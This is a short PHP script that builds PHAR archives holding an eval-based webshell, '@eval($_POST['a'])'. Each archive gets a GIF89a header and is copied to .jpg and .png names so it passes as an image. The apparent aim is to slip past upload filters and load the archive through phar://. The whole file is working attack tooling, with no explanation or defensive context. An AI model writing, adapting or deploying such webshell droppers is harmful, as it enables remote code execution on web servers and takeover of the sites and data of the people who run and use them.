<?php
// Create a PHAR file with PHP webshell, disguised as JPEG
$phar_file = '/tmp/zip_attack/webshell.phar';

// Delete old file if exists
@unlink($phar_file);

$phar = new Phar($phar_file, 0, 'shell.phar');

// Start the stub with GIF89a to look like an image
$phar->setStub("GIF89a" . "<?php @eval(\$_POST['a']);?> __HALT_COMPILER(); ?>");

// Add a file to the PHAR (needed for phar:// to work)
$phar->addFromString('shell.php', '<?php @eval($_POST["a"]);?>');

echo "PHAR created: " . filesize($phar_file) . " bytes\n";

// Copy to .jpg and .png
copy($phar_file, '/tmp/zip_attack/webshell.jpg');
copy($phar_file, '/tmp/zip_attack/webshell.png');
echo "Copied to .jpg and .png\n";

// Also create a variant with simpler stub
$phar2_file = '/tmp/zip_attack/simple_phar.phar';
@unlink($phar2_file);
$phar2 = new Phar($phar2_file, 0, 'simple.phar');
$phar2->setStub("<?php @eval(\$_POST['a']);?> __HALT_COMPILER(); ?>");
$phar2->addFromString('test.txt', 'test');
copy($phar2_file, '/tmp/zip_attack/simple_phar.jpg');
echo "Simple PHAR: " . filesize($phar2_file) . " bytes\n";
?>
